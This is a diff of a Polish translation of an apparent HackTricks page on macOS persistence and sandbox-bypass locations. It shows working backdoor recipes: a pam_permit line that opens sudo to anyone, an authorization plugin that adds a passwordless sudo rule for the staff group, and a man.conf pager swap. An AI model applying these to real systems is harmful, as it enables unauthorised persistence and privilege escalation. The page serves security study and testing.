 ```bash
 [Key] com.apple.security.temporary-exception.sbpl
 [Value]
@@ -930,21 +944,21 @@ Zauważ, że binarny plik ładujący twoją bibliotekę ma **bardzo restrykcyjn�
 ```
 ### Finder Sync Plugins
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
-**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)
+**Opis**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
+**Opis**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)
 
-- Przydatne do obejścia sandbox: **Nie, ponieważ musisz uruchomić swoją własną aplikację**
-- Obejście TCC: ???
+- Przydatne do obejścia sandbox: **Nie, ponieważ musisz uruchomić własną aplikację**
+- TCC bypass: ???
 
 #### Lokalizacja
 
 - Konkretna aplikacja
 
-#### Opis i Eksploatacja
+#### Opis & Exploit
 
-Przykład aplikacji z rozszerzeniem Finder Sync [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).
+Przykład aplikacji z Finder Sync Extension [**można znaleźć tutaj**](https://github.com/D00MFist/InSync).
 
-Aplikacje mogą mieć `Finder Sync Extensions`. To rozszerzenie będzie działać w aplikacji, która zostanie uruchomiona. Ponadto, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **sandboxed** (chociaż mogą być dodane luźniejsze wyjątki) i musi być zarejestrowane w czymś takim jak:
+Aplikacje mogą mieć `Finder Sync Extensions`. To rozszerzenie będzie umieszczone wewnątrz aplikacji, która zostanie uruchomiona. Co więcej, aby rozszerzenie mogło wykonać swój kod, **musi być podpisane** ważnym certyfikatem dewelopera Apple, musi być **sandboxed** (chociaż można dodać złagodzone wyjątki) i musi być zarejestrowane z czymś w rodzaju:
 ```bash
 pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
 pluginkit -e use -i com.example.InSync.InSync
@@ -954,28 +968,28 @@ pluginkit -e use -i com.example.InSync.InSync
 Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
 Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
 
-- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale skończysz w wspólnej piaskownicy aplikacji
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Jednak skończysz w zwykłej piaskownicy aplikacji
+- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
 - `/System/Library/Screen Savers`
-- Wymagane uprawnienia roota
+- Wymaga uprawnień root
 - **Wyzwalacz**: Wybierz wygaszacz ekranu
 - `/Library/Screen Savers`
-- Wymagane uprawnienia roota
+- Wymaga uprawnień root
 - **Wyzwalacz**: Wybierz wygaszacz ekranu
 - `~/Library/Screen Savers`
 - **Wyzwalacz**: Wybierz wygaszacz ekranu
 
 <figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>
 
-#### Opis i Eksploatacja
+#### Opis i Exploit
 
-Utwórz nowy projekt w Xcode i wybierz szablon do generowania nowego **Wygaszacza ekranu**. Następnie dodaj swój kod, na przykład poniższy kod do generowania logów.
+Utwórz nowy projekt w Xcode i wybierz szablon tworzący nowy **Screen Saver**. Następnie dodaj do niego swój kod — na przykład poniższy kod generujący logi.
 
-**Zbuduj** go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i po prostu na niego kliknij, powinno to wygenerować wiele logów:
+Skompiluj go i skopiuj pakiet `.saver` do **`~/Library/Screen Savers`**. Następnie otwórz GUI wygaszacza ekranu i jeśli po prostu klikniesz na niego, powinien wygenerować dużo logów:
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'
 
@@ -985,8 +999,8 @@ Timestamp                       (process)[PID]
 2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
 ```
 > [!CAUTION]
-> Zauważ, że ponieważ wewnątrz uprawnień binarnego pliku, który ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), możesz znaleźć **`com.apple.security.app-sandbox`**, będziesz **wewnątrz wspólnego piaskownicy aplikacji**.
-
+> Zauważ, że ponieważ w entitlements binarki, która ładuje ten kod (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) znajduje się **`com.apple.security.app-sandbox`**, będziesz **inside the common application sandbox**.
+  
 Saver code:
 ```objectivec
 //
@@ -1053,39 +1067,39 @@ NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
 
 @end
 ```
-### Spotlight Plugins
+### Wtyczki Spotlight
 
 writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)
 
-- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale skończysz w piaskownicy aplikacji
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
-- Piaskownica wydaje się bardzo ograniczona
+- Useful to bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- But you will end in an application sandbox
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+- The sandbox looks very limited
 
-#### Location
+#### Lokalizacja
 
 - `~/Library/Spotlight/`
-- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
+- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
 - `/Library/Spotlight/`
-- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
+- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
 - Wymagane uprawnienia roota
 - `/System/Library/Spotlight/`
-- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
+- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
 - Wymagane uprawnienia roota
 - `Some.app/Contents/Library/Spotlight/`
-- **Trigger**: Tworzony jest nowy plik z rozszerzeniem zarządzanym przez wtyczkę spotlight.
+- **Wyzwalacz**: Utworzono nowy plik z rozszerzeniem obsługiwanym przez spotlight plugin.
 - Wymagana nowa aplikacja
 
-#### Description & Exploitation
+#### Opis i eksploatacja
 
-Spotlight to wbudowana funkcja wyszukiwania w macOS, zaprojektowana w celu zapewnienia użytkownikom **szybkiego i kompleksowego dostępu do danych na ich komputerach**.\
-Aby ułatwić tę szybką zdolność wyszukiwania, Spotlight utrzymuje **własną bazę danych** i tworzy indeks poprzez **analizowanie większości plików**, co umożliwia szybkie wyszukiwanie zarówno po nazwach plików, jak i ich zawartości.
+Spotlight to wbudowana funkcja wyszukiwania w macOS, zaprojektowana, by zapewnić użytkownikom **szybki i kompleksowy dostęp do danych na ich komputerach**.  
+Aby umożliwić takie szybkie wyszukiwanie, Spotlight utrzymuje **własną bazę danych** i tworzy indeks poprzez **parsowanie większości plików**, co pozwala na szybkie wyszukiwanie zarówno po nazwach plików, jak i po ich zawartości.
 
-Podstawowy mechanizm Spotlight obejmuje centralny proces nazwany 'mds', co oznacza **'serwer metadanych'.** Proces ten koordynuje całą usługę Spotlight. Uzupełniają go liczne demony 'mdworker', które wykonują różnorodne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Te zadania są możliwe dzięki wtyczkom importera Spotlight, czyli **".mdimporter bundles"**, które umożliwiają Spotlight zrozumienie i indeksowanie zawartości w różnych formatach plików.
+Podstawowy mechanizm Spotlight obejmuje centralny proces o nazwie 'mds', który oznacza **'serwer metadanych'**. Proces ten orkiestruje cały serwis Spotlight. Uzupełniają go liczne demony 'mdworker', które wykonują różne zadania konserwacyjne, takie jak indeksowanie różnych typów plików (`ps -ef | grep mdworker`). Zadania te są możliwe dzięki importerom Spotlight, czyli **".mdimporter bundles"**, które umożliwiają Spotlight zrozumienie i indeksowanie treści w różnorodnych formatach plików.
 
-Wtyczki lub **`.mdimporter`** bundles znajdują się w wcześniej wspomnianych miejscach, a jeśli pojawi się nowy bundle, jest ładowany w ciągu minuty (nie ma potrzeby ponownego uruchamiania żadnej usługi). Te bundle muszą wskazywać, które **typy plików i rozszerzenia mogą obsługiwać**, w ten sposób Spotlight będzie ich używać, gdy zostanie utworzony nowy plik z wskazanym rozszerzeniem.
+Wtyczki, czyli pakiety **`.mdimporter`**, znajdują się w wcześniej wymienionych lokalizacjach, a jeśli pojawi się nowy bundle, zostanie załadowany w ciągu minuty (nie ma potrzeby restartu żadnej usługi). Pakiety te muszą wskazać, jakie **typy plików i rozszerzenia potrafią obsługiwać**, dzięki czemu Spotlight użyje ich, gdy zostanie utworzony nowy plik z danym rozszerzeniem.
 
-Możliwe jest **znalezienie wszystkich `mdimporters`** załadowanych w trakcie działania:
+Możliwe jest **znalezienie wszystkich załadowanych i uruchomionych `mdimporters`**:
 ```bash
 mdimport -L
 Paths: id(501) (
@@ -1094,7 +1108,7 @@ Paths: id(501) (
 "/System/Library/Spotlight/PDF.mdimporter",
 [...]
 ```
-A na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** jest używane do analizowania tego typu plików (rozszerzenia `.iba` i `.book` oraz innych):
+Na przykład **/Library/Spotlight/iBooksAuthor.mdimporter** jest używany do parsowania tego typu plików (rozszerzenia `.iba` i `.book` między innymi):
 ```json
 plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 
@@ -1131,61 +1145,61 @@ plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist
 [...]
 ```
 > [!CAUTION]
-> Jeśli sprawdzisz Plist innych `mdimporter`, możesz nie znaleźć wpisu **`UTTypeConformsTo`**. To dlatego, że jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie trzeba określać rozszerzeń.
+> Jeśli sprawdzisz Plist innych `mdimporter` możesz nie znaleźć wpisu **`UTTypeConformsTo`**. To dlatego, że jest to wbudowany _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) i nie musi określać rozszerzeń.
 >
-> Ponadto, domyślne wtyczki systemowe zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są w inny sposób indeksowane przez własne `mdimporters` Apple.
+> Co więcej, domyślne w systemie pluginy zawsze mają pierwszeństwo, więc atakujący może uzyskać dostęp tylko do plików, które nie są indeksowane przez własne `mdimporters` Apple'a.
 
-Aby stworzyć własny importer, możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) i następnie zmienić nazwę, **`CFBundleDocumentTypes`** oraz dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz wspierać i odzwierciedlić je w **`schema.xml`**.\
-Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonać swój ładunek, gdy plik z przetworzonym rozszerzeniem zostanie utworzony.
+Aby stworzyć własny importer możesz zacząć od tego projektu: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), a następnie zmienić nazwę, **`CFBundleDocumentTypes`** i dodać **`UTImportedTypeDeclarations`**, aby obsługiwał rozszerzenie, które chcesz wspierać, oraz odzwierciedlić je w **`schema.xml`**.\
+Następnie **zmień** kod funkcji **`GetMetadataForFile`**, aby wykonać swój payload, kiedy zostanie utworzony plik z przetwarzanym rozszerzeniem.
 
-Na koniec **zbuduj i skopiuj swój nowy `.mdimporter`** do jednej z wcześniejszych lokalizacji i możesz sprawdzić, czy jest ładowany **monitorując logi** lub sprawdzając **`mdimport -L.`**
+Na koniec **zbuduj i skopiuj swój nowy `.mdimporter`** do jednej z poprzednich lokalizacji i możesz sprawdzać, czy został załadowany, **monitorując logi** lub sprawdzając **`mdimport -L.`**
 
 ### ~~Preference Pane~~
 
 > [!CAUTION]
-> Nie wygląda na to, że to już działa.
+> Wygląda na to, że to już nie działa.
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)
 
-- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Wymaga konkretnej akcji użytkownika
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandboxu: [🟠](https://emojipedia.org/large-orange-circle)
+- Wymaga specyficznej akcji użytkownika
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Lokalizacja
+#### Location
 
 - **`/System/Library/PreferencePanes`**
 - **`/Library/PreferencePanes`**
 - **`~/Library/PreferencePanes`**
 
-#### Opis
+#### Description
 
-Nie wygląda na to, że to już działa.
+Wygląda na to, że to już nie działa.
 
-## Obejście Sandbox Root
+## Root Sandbox Bypass
 
 > [!TIP]
-> Tutaj możesz znaleźć lokalizacje startowe przydatne do **obejścia sandbox**, które pozwala na proste wykonanie czegoś przez **zapisanie go w pliku** będąc **rootem** i/lub wymagając inne **dziwne warunki.**
+> Tutaj możesz znaleźć lokacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu coś wykonać przez **zapisanie tego do pliku** będąc **root** i/lub wymagając innych **dziwnych warunków.**
 
-### Okresowe
+### Periodic
 
 Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)
 
-- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być rootem
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandboxu: [🟠](https://emojipedia.org/large-orange-circle)
+- Ale musisz być root
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Lokalizacja
+#### Location
 
 - `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
 - Wymagany root
-- **Wyzwalacz**: Gdy nadejdzie czas
+- **Trigger**: Gdy nadejdzie odpowiedni czas
 - `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`
 - Wymagany root
-- **Wyzwalacz**: Gdy nadejdzie czas
+- **Trigger**: Gdy nadejdzie odpowiedni czas
 
-#### Opis i Eksploatacja
+#### Description & Exploitation
 
-Skrypty okresowe (**`/etc/periodic`**) są wykonywane z powodu **demonów uruchamiających** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Zauważ, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc to nie zadziała w przypadku potencjalnego podniesienia uprawnień.
+Skrypty periodiczne (**`/etc/periodic`**) są uruchamiane z powodu **launch daemons** skonfigurowanych w `/System/Library/LaunchDaemons/com.apple.periodic*`. Zauważ, że skrypty przechowywane w `/etc/periodic/` są **wykonywane** jako **właściciel pliku**, więc to nie zadziała jako potencjalna eskalacja uprawnień.
 ```bash
 # Launch daemons that will execute the periodic scripts
 ls -l /System/Library/LaunchDaemons/com.apple.periodic*
@@ -1223,37 +1237,37 @@ daily_local="/etc/daily.local"				# Local scripts
 weekly_local="/etc/weekly.local"			# Local scripts
 monthly_local="/etc/monthly.local"			# Local scripts
 ```
-Jeśli uda ci się napisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **wykonany prędzej czy później**.
+Jeśli uda Ci się zapisać którykolwiek z plików `/etc/daily.local`, `/etc/weekly.local` lub `/etc/monthly.local`, zostanie on **wykonany prędzej czy później**.
 
 > [!WARNING]
-> Zauważ, że skrypt okresowy będzie **wykonywany jako właściciel skryptu**. Więc jeśli zwykły użytkownik jest właścicielem skryptu, zostanie on wykonany jako ten użytkownik (może to zapobiec atakom eskalacji uprawnień).
+> Zwróć uwagę, że skrypt uruchamiany okresowo będzie **wykonywany jako jego właściciel**. Jeśli zwykły użytkownik jest właścicielem skryptu, zostanie on wykonany jako ten użytkownik (może to uniemożliwić ataki eskalacji uprawnień).
 
 ### PAM
 
-Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
-Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)
+Opis: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
+Opis: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)
 
-- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być rootem
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Jednak wymagane są uprawnienia root
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
-- Root zawsze wymagany
+- Zawsze wymagane uprawnienia root
 
 #### Opis i Eksploatacja
 
-Ponieważ PAM jest bardziej skoncentrowany na **utrzymywaniu** i złośliwym oprogramowaniu niż na łatwym wykonywaniu w macOS, ten blog nie poda szczegółowego wyjaśnienia, **przeczytaj writeupy, aby lepiej zrozumieć tę technikę**.
+Ponieważ PAM skupia się bardziej na **persistence** i **malware** niż na łatwym uruchamianiu w macOS, ten blog nie będzie podawać szczegółowego wyjaśnienia; **przeczytaj writeupy, aby lepiej zrozumieć tę technikę**.
 
 Sprawdź moduły PAM za pomocą:
 ```bash
 ls -l /etc/pam.d
 ```
-Technika utrzymywania/eskalacji uprawnień wykorzystująca PAM jest tak prosta, jak modyfikacja modułu /etc/pam.d/sudo, dodając na początku linię:
+Technika persistence/privilege escalation wykorzystująca PAM jest tak prosta, jak zmodyfikowanie modułu /etc/pam.d/sudo poprzez dodanie na początku następującej linii:
 ```bash
 auth       sufficient     pam_permit.so
 ```
-Więc to będzie **wyglądać** mniej więcej tak:
+Więc będzie to **wyglądać** mniej więcej tak:
 ```bash
 # sudo: auth account password session
 auth       sufficient     pam_permit.so
@@ -1264,12 +1278,12 @@ account    required       pam_permit.so
 password   required       pam_deny.so
 session    required       pam_permit.so
 ```
-I dlatego każda próba użycia **`sudo` zadziała**.
+W związku z tym każda próba użycia **`sudo` zadziała**.
 
 > [!CAUTION]
-> Zauważ, że ten katalog jest chroniony przez TCC, więc jest bardzo prawdopodobne, że użytkownik otrzyma monit o dostęp.
+> Zauważ, że ten katalog jest chroniony przez TCC, więc bardzo prawdopodobne, że użytkownik otrzyma monit proszący o dostęp.
 
-Innym dobrym przykładem jest su, gdzie możesz zobaczyć, że również możliwe jest przekazywanie parametrów do modułów PAM (i możesz również wprowadzić backdoora do tego pliku):
+Innym dobrym przykładem jest su, gdzie widać, że możliwe jest także przekazywanie parametrów do modułów PAM (i można też backdoor ten plik):
 ```bash
 cat /etc/pam.d/su
 # su: auth account session
@@ -1280,24 +1294,24 @@ account    required       pam_opendirectory.so no_check_shell
 password   required       pam_opendirectory.so
 session    required       pam_launchd.so
 ```
-### Wtyczki autoryzacji
+### Authorization Plugins
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
-Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
+Artykuł: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
+Artykuł: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
 
 - Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być rootem i wykonać dodatkowe konfiguracje
-- Obejście TCC: ???
+- Ale musisz być root i wykonać dodatkowe konfiguracje
+- TCC bypass: ???
 
 #### Lokalizacja
 
 - `/Library/Security/SecurityAgentPlugins/`
-- Wymagany root
-- Konieczne jest również skonfigurowanie bazy danych autoryzacji, aby używała wtyczki
+- Wymagane uprawnienia root
+- Konieczne jest też skonfigurowanie authorization database, żeby używać pluginu
 
-#### Opis i eksploatacja
+#### Opis & Exploitation
 
-Możesz stworzyć wtyczkę autoryzacji, która będzie wykonywana, gdy użytkownik się loguje, aby utrzymać persistencję. Aby uzyskać więcej informacji na temat tego, jak stworzyć jedną z tych wtyczek, sprawdź wcześniejsze opisy (i bądź ostrożny, źle napisana może zablokować dostęp i będziesz musiał oczyścić swojego maca w trybie odzyskiwania).
+Możesz utworzyć authorization plugin, który zostanie uruchomiony, gdy użytkownik się zaloguje (logs-in) w celu utrzymania persistence. Po więcej informacji o tym, jak stworzyć taki plugin sprawdź wcześniejsze writeupy (i uwaga — źle napisany plugin może zablokować dostęp i będziesz musiał wyczyścić swój mac z recovery mode).
 ```objectivec
 // Compile the code and create a real bundle
 // gcc -bundle -framework Foundation main.m -o CustomAuth
@@ -1312,11 +1326,11 @@ NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
 system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
 }
 ```
-**Przenieś** pakiet do lokalizacji, w której ma być załadowany:
+**Przenieś** bundle do lokalizacji, z której zostanie załadowany:
 ```bash
 cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
 ```
-Na koniec dodaj **zasadę** do załadowania tego wtyczki:
+Na koniec dodaj **regułę** ładującą ten Plugin:
 ```bash
 cat > /tmp/rule.plist <<EOF
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1335,37 +1349,37 @@ EOF
 
 security authorizationdb write com.asdf.asdf < /tmp/rule.plist
 ```
-**`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm autoryzacji**. Ponadto, **`privileged`** spowoduje, że zostanie on wykonany przez root.
+The **`evaluate-mechanisms`** poinformuje framework autoryzacji, że będzie musiał **wywołać zewnętrzny mechanizm do autoryzacji**. Ponadto, **`privileged`** spowoduje, że będzie uruchomiony przez root.
 
 Wywołaj to za pomocą:
 ```bash
 security authorize com.asdf.asdf
 ```
-A następnie **grupa pracowników powinna mieć dostęp sudo** (przeczytaj `/etc/sudoers`, aby potwierdzić).
+A następnie grupa 'staff' powinna mieć dostęp sudo (przeczytaj `/etc/sudoers`, aby to potwierdzić).
 
 ### Man.conf
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
+Opis: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)
 
-- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być rootem, a użytkownik musi używać man
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Jednak musisz być root, a użytkownik musi używać man
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
 #### Lokalizacja
 
 - **`/private/etc/man.conf`**
-- Wymagany root
-- **`/private/etc/man.conf`**: Kiedy man jest używany
+- Wymagane uprawnienia root
+- **`/private/etc/man.conf`**: Za każdym razem gdy używany jest man
 
-#### Opis i Eksploatacja
+#### Opis & Exploit
 
-Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarny/skrypt do użycia podczas otwierania plików dokumentacji man. Ścieżka do wykonywalnego pliku może być zmodyfikowana, więc za każdym razem, gdy użytkownik używa man do przeglądania dokumentów, uruchamiana jest tylna furtka.
+Plik konfiguracyjny **`/private/etc/man.conf`** wskazuje binarkę/skrypt do użycia podczas otwierania plików dokumentacji man. Ścieżka do wykonywalnego pliku może być zmodyfikowana, więc za każdym razem, gdy użytkownik użyje man do czytania dokumentacji, uruchamiany jest backdoor.
 
-Na przykład ustawione w **`/private/etc/man.conf`**:
+Na przykład ustaw w **`/private/etc/man.conf`**:
 ```
 MANPAGER /tmp/view
 ```
-A następnie utwórz `/tmp/view` jako:
+Następnie utwórz `/tmp/view` jako:
 ```bash
 #!/bin/zsh
 
@@ -1375,26 +1389,26 @@ touch /tmp/manconf
 ```
 ### Apache2
 
-**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
+**Opis**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)
 
-- Przydatne do obejścia piaskownicy: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być rootem, a apache musi być uruchomiony
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
-- Httpd nie ma uprawnień
+- Przydatne do bypass sandbox: [🟠](https://emojipedia.org/large-orange-circle)
+- Ale musisz być root i apache musi być uruchomiony
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
+- Httpd nie ma entitlements
 
-#### Location
+#### Lokalizacja
 
 - **`/etc/apache2/httpd.conf`**
-- Wymagany root
-- Wyzwalacz: Gdy Apache2 jest uruchamiany
+- Wymagane uprawnienia root
+- Wyzwalacz: Gdy Apache2 zostanie uruchomiony
 
-#### Description & Exploit
+#### Opis & Exploit
 
-Możesz wskazać w `/etc/apache2/httpd.conf`, aby załadować moduł, dodając linię taką jak:
+Możesz w `/etc/apache2/httpd.conf` wskazać załadowanie modułu, dodając linię taką jak:
 ```bash
 LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
 ```
-W ten sposób twoje skompilowane moduły będą ładowane przez Apache. Jedyną rzeczą jest to, że musisz **podpisać je ważnym certyfikatem Apple**, lub musisz **dodać nowy zaufany certyfikat** w systemie i **podpisać go** tym certyfikatem.
+W ten sposób twój skompilowany moduł zostanie załadowany przez Apache. Jedyną rzeczą jest to, że albo musisz go **podpisać ważnym certyfikatem Apple**, albo musisz **dodać nowy zaufany certyfikat** w systemie i **podpisać go nim**.
 
 Następnie, jeśli to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:
 ```bash
@@ -1414,36 +1428,36 @@ syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
 ```
 ### BSM audit framework
 
-Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)
+Opis: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)
 
-- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
-- Ale musisz być root, auditd musi działać i spowodować ostrzeżenie
-- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)
+- Przydatne do obejścia sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
+- Ale musisz być root, auditd musi być uruchomiony i trzeba spowodować ostrzeżenie
+- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
 
-#### Location
+#### Lokalizacja
 
 - **`/etc/security/audit_warn`**
 - Wymagany root
-- **Trigger**: Gdy auditd wykryje ostrzeżenie
+- **Wyzwalacz**: Gdy auditd wykryje ostrzeżenie
 
-#### Description & Exploit
+#### Opis & Exploit
 
-Kiedy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **wykonywany**. Możesz więc dodać swój ładunek do niego.
+Za każdym razem, gdy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **uruchamiany**. Możesz więc dodać w nim swój payload.
 ```bash
 echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
 ```
 Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.
 
-### Elementy uruchamiania
+### Elementy startowe
 
-> [!CAUTION] > **To jest przestarzałe, więc nic nie powinno być znalezione w tych katalogach.**
+> [!CAUTION] > **To jest przestarzałe, więc w tych katalogach nic nie powinno się znajdować.**
 
-**StartupItem** to katalog, który powinien być umieszczony w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu, musi on zawierać dwa konkretne pliki:
+Katalog **StartupItem** to katalog, który powinien znajdować się w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu musi on zawierać dwa określone pliki:
 
-1. **skrypt rc**: Skrypt powłoki wykonywany podczas uruchamiania.
-2. **plik plist**, nazwany `StartupParameters.plist`, który zawiera różne ustawienia konfiguracyjne.
+1. **rc script**: skrypt powłoki uruchamiany przy starcie.
+2. Plik **plist**, konkretnie o nazwie `StartupParameters.plist`, zawierający różne ustawienia konfiguracyjne.
 
-Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` są poprawnie umieszczone w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.
+Upewnij się, że zarówno **rc script**, jak i plik `StartupParameters.plist` są poprawnie umieszczone w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.
 
 {{#tabs}}
 {{#tab name="StartupParameters.plist"}}
@@ -1490,45 +1504,45 @@ RunService "$1"
 ### ~~emond~~
 
 > [!CAUTION]
-> Nie mogę znaleźć tego komponentu w moim macOS, więc w celu uzyskania dalszych informacji sprawdź opis
+> Nie mogę znaleźć tego składnika na moim macOS — więcej informacji w writeupie
 
